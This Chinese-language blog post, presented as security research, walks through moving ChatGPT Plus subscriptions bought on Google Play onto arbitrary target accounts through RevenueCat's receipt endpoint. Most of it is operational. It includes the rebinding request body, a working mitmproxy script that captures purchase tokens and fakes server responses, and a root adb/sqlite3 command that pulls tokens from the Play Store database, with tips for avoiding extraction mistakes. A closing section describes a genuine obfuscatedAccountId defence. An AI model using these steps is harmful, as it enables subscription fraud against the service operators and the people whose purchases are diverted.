---
title: "付款人和开通账号各走各的：复盘 ChatGPT Plus 在 Google Play 与 RevenueCat 间的订阅转移链路"
description: "剖析 ChatGPT Android 客户端通过 RevenueCat 中间层核销 Google Play 订阅时的归属解耦缺陷：为什么拦截 POST /v1/receipts 里的 fetch_token（或从 library.db 含 WAL 日志中提取）就能把订阅挂到任意目标 account_id 头下，以及如何用 setObfuscatedAccountId 彻底堵住缺口。"
date: 2026-07-17T16:00:00+08:00
draft: false
categories: ["安全研究", "支付安全"]
tags: ["ChatGPT", "Google Play", "RevenueCat", "订阅转移", "Android 安全", "SQLite"]
weight: 10
---

前面聊过早期的 [iOS 收据重复提交漏洞](/posts/gpt-plus-receipt-vulnerability-2026/)，也聊过 [Android 端 `offerToken` 内存调包](/posts/gpt-plus-exploit-revenuecat-vulnerability/)。到了 2026 年年中，外面代充圈子里跑得最稳的其实是另一条路子：不改一分钱价格，也不拿同一张旧收据反复刷，而是老老实实在 Google Play 上完成一次购买（或合法的首月试用），半道把热乎的购买凭证截下来，转手绑到另一个八竿子打不着的目标 ChatGPT 账号头上。

能干成这种"张三在收银台掏钱买单、李四拿着小票去取餐口领汉堡"的事，病根全出在 Google Play、第三方订阅管理平台 RevenueCat 和 OpenAI 业务后端这三层拼装在一起时的身份解耦上。下面把整条链路的协议报文、本地数据库取证坑点以及官方本该配上的标准防御锁顺一遍。

## 0x00 三层各管一摊：`fetch_token` 与 `app_user_id` 互不核对

OpenAI 在安卓端并没有自己从零写一套直连 Google Play Developer API 的账单状态机，而是在中间垫了一层现成的订阅聚合 SaaS 平台 RevenueCat。

当你在安卓手机上点完 Google Play 付款确认框，谷歌扣完款（或核准试用），会把一枚很长的购买凭据 `purchaseToken` 交回给手机上的 ChatGPT App；紧接着，App 转头向 RevenueCat 的核心核销接口 `POST https://api.revenuecat.com/v1/receipts` 发包，请求体里最关键的就是下面这几行：

```json
{
  "fetch_token": "<Google Play 刚返回的 purchaseToken>",
  "app_user_id": "<当前登录的 OpenAI account_id (UUID)>",
  "product_ids": ["oai.chatgpt.plus"],
  "platform_product_ids": [{"product_id": "oai.chatgpt.plus"}],
  "is_restore": true,
  "observer_mode": false,
  "purchase_completed_by": "revenuecat",
  "initiation_source": "unsynced_active_purchases",
  "sdk_originated": false,
  "payload_version": 1
}
```

盯住 `fetch_token` 和 `app_user_id` 这两个字段，就能一眼看穿盲点在哪了。

Google Play 只认手机商店里登着的那个谷歌账号，收完钱吐出一张真凭实据 `fetch_token`。注意谷歌有个硬性时间窗口：如果这枚令牌在生成后的 72 小时之内没有被后端调接口执行 `Acknowledge`（确认消费），Google Play 会认为发货失败，自动把钱原路退回并作废这笔订单。

而中间的 RevenueCat 收到请求时，鉴权头里压根没带任何与具体用户绑定的私人登录令牌，用的只是所有安卓客户端共用的一串固定公开 SDK Key（形如 `Authorization: Bearer goog_<REDACTED_PUBLIC_SDK_KEY>`，配合 `Dalvik/2.1.0 ...` 的安卓系统 User-Agent）。RevenueCat 拿着 `fetch_token` 去问谷歌服务器："这张小票是真的吗？之前被人确认消费过吗？"只要谷歌回话说小票是真的且处于未确认状态，RevenueCat 当场就会执行 `Acknowledge` 把这张票核销掉（一票一用，核销完就不能再给第三个号用了），然后顺着请求体里指定的 `"is_restore": true` 和 `app_user_id`，把 `chatgpt_plus` 权益直接挂到那个目标 UUID 名下并回调通知 OpenAI 后端开权：

```json
{
  "subscriber": {
    "entitlements": {
      "chatgpt_plus": {
        "expires_date": "2026-08-17T07:13:32Z",
        "product_identifier": "oai.chatgpt.plus",
        "purchase_date": "2026-07-17T07:13:32Z"
      }
    },
    "subscriptions": {
      "oai.chatgpt.plus": {
        "period_type": "trial",
        "price": { "amount": 0.0, "currency": "JPY" },
        "store": "play_store",
        "expires_date": "2026-08-17T07:13:32Z"
      }
    }
  }
}
```

更有意思的是，抓包时能看到正版客户端在请求头里还带了一个叫 `X-Post-Params-Hash`（格式为 `app_user_id,fetch_token:sha256:<哈希>`）和 `X-Nonce` 的字段，看着挺像防篡改签名；结果实测下来，当时服务端压根没强制校验这两个头，留空或者换了 `app_user_id` 不重算照样返回 `200`。

## 0x01 截留未消费 `fetch_token` 的两条路子与 SQLite WAL 大坑

想把 A 环境买出来的 `fetch_token` 留着绑给 B 账号（目标号的 UUID 可以直接从已登录浏览器的 `https://chatgpt.com/api/auth/session` 或安卓接口 `/backend-api/accounts/check/v4-2023-04-27` 里读出来），唯一的前提就是：绝不能让买单那台手机上的 ChatGPT App 把 `POST /v1/receipts` 请求顺利发到 RevenueCat 服务器去，一旦发过去当场就被核销锁死在临时号身上了。

在安全研究环境里截住这枚令牌有两条路子，但两条路各自都有新手常踩的坑。

第一条路是在搞定了系统级根证书挂载（Android 14+ 位于 `/apex/com.android.conscrypt/cacerts`）和反证书锁定的测试机上跑 `mitmproxy` 实时阻断。前面说过，Android 7.0 之后光装用户级证书是抓不到官方客户端明文包的。代理配通之后，挂一段简单的拦截脚本专门盯紧 `/v1/receipts` 的 POST 请求：把请求体里的 `fetch_token` 落盘存好，然后当场给客户端回一个空的 `200` 假响应把上行链路掐断，让这枚令牌稳稳停在 72 小时未 `Acknowledge` 的待消费状态：

```python
import json
import time
from mitmproxy import http

class RevenueCatInterceptor:
    def request(self, flow: http.HTTPFlow) -> None:
        if flow.request.method == "POST" and flow.request.pretty_url.endswith("/v1/receipts"):
            body = json.loads(flow.request.get_text())
            fetch_token = body.get("fetch_token", "")
            if fetch_token:
                record = {
                    "captured_at": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
                    "original_user_id": body.get("app_user_id", ""),
                    "fetch_token": fetch_token,
                }
                with open("captured_tokens.jsonl", "a", encoding="utf-8") as fp:
                    fp.write(json.dumps(record) + "\n")
                # 返回空权益假响应阻断真实核销请求
                flow.response = http.Response.make(
                    200,
                    b'{"subscriber":{"entitlements":{}}}',
                    {"Content-Type": "application/json"},
                )

addons = [RevenueCatInterceptor()]
```

第二条路是不架实时代理，在 Play 弹窗付完钱的瞬间切掉 ChatGPT App 的网络，转头用 Root 权限去掏本机 Google Play 商店（`com.android.vending`）自己的私有数据库 `/data/data/com.android.vending/databases/library.db`。商店里所有的购买记录都存在 `ownership` 表里（核心列是谷歌邮箱 `account`、应用商品标识 `doc_id` 和存着完整回执 JSON 的 `inapp_purchase_data`），里面明明白白躺着 `GPA.xxxx` 订单号、`"acknowledged": false` 状态和那串 `purchaseToken`。

这里必须点破一个十个写 ADB 脚本的人里有八个会栽跟头的 SQLite 坑！网上流传的提取脚本只写了一句 `cp .../library.db /sdcard/.tmp.db && chmod 644 ...`，这写法一脚踩了两个雷：

1. 现代 Android 系统里的 SQLite 默认全开着 WAL（Write-Ahead Logging，预写式日志）模式。刚付完款那几分钟里，最新写进去的那行购买记录其实还躺在同目录的 `library.db-wal` 日志文件里，根本没 Checkpoint 刷回主文件 `library.db`！你只单独拷走一个 `library.db` 拉回电脑查，打开一看空空如也，还以为没买成功。
2. 把装满全机所有付费隐私记录的 `library.db` 拷进公共可读的 `/sdcard/` 目录再设成 `chmod 644`，整台手机上随便哪个流氓软件都能顺手把它读走。

干净稳妥的做法是直接在 `su` root shell 内部调系统自带的 `sqlite3` 读取（SQLite 引擎在原目录打开库时会自动合并旁边的 `-wal` 和 `-shm` 日志），或者把 `library.db`、`library.db-wal`、`library.db-shm` 三个文件一块儿打包进权限 `600` 的受保护临时目录再拉取：

```bash
adb shell "su -c 'sqlite3 /data/data/com.android.vending/databases/library.db \
  \"SELECT account, doc_id, inapp_purchase_data FROM ownership WHERE doc_id LIKE '\''%chatgpt%'\'' ORDER BY rowid DESC LIMIT 5;\"'"
```

顺便把这条安卓转移链跟早年的 iOS 收据漏洞做个清晰区分：

| 对比维度 | 早期 iOS 收据复用漏洞 | Android `purchaseToken` 转移链路 |
|---|---|---|
| 核销架构 | 客户端收据直传 OpenAI 后端 | 经由第三方聚合层 RevenueCat 中转 |
| 凭证复用次数 | 一张收据曾可反复绑多个号（`1 -> N`） | 一枚令牌一旦 `Acknowledge` 即消费锁定（`1 -> 1`，72 小时不用自动退款） |
| 账号消耗约束 | 单一购买源反复重放 | 每个 Google 号仅有一次免费试用资格，高频购买退订极易触发谷歌风控封号 |

## 0x02 谷歌早就留好了官方解药：把 `obfuscatedAccountId` 验起来

不少分析文章聊到最后得出个结论，说"除非 OpenAI 扔掉 RevenueCat 推倒重做整套内购系统，否则这洞根本没法修"。这真是冤枉了 Google Play Billing 的架构师：谷歌官方文档里从几年前起就专门针对这种跨号"移花接木"备好了现成的标准字段，改起来连十行代码都用不了。

要把这条转移链路彻底焊死，只需要把客户端下单、谷歌商店存证、服务端核销这三步里的身份锚点串起来。

第一步在客户端拉起支付框那一刻：当 ChatGPT App 构建 `BillingFlowParams.Builder` 准备调 Google Play 收银台时，显式调一句官方 API `setObfuscatedAccountId(sha256_hex(current_openai_account_id))`（在 iOS 端 StoreKit 2 里对应的姐妹字段叫 `appAccountToken`）。谷歌服务器会把这串混淆后的站内账号哈希死死刻在这笔订单和对应的 `purchaseToken` 档案里，后续不管谁用 MITM 还是 Root 去掏本地数据库，都改不动谷歌云端存着的这个值。

第二步在 RevenueCat 或业务后端核销那一刻：当有人拿着一枚未确认的 `fetch_token` 调 `POST /v1/receipts` 请求绑到某个 `app_user_id` 头上（尤其是挂着 `is_restore: true` 旗号的首次跨号认领）时，后端从 Google Play Developer API（`purchases.subscriptionsv2.get`）读回订单对象里的 `externalAccountIdentifiers.obfuscatedAccountId` 字段，当场跟当前请求里的 `sha256_hex(app_user_id)` 比一下等不等。两边哈希一旦对不上，说明买这张票的根本不是眼前这个账号，直接拒掉 `Acknowledge` 并拦截开权。

第三步再顺手把请求头里原本形同虚设的签名校验（或由自家后端在登录态下签发的一次性预购绑定票据）真正启用起来，别让脱离了真实登录会话的裸脚本光凭一串公开的 `goog_...` 客户端 SDK Key 就能随便往核销接口里灌数据。把这三颗螺丝拧紧，"张三买单、李四领餐"的生意自然就彻底关张了。

---

*文中所涉协议公钥、订单号与账户 UUID 均已脱敏处理，仅作移动内购架构安全防御讨论。*
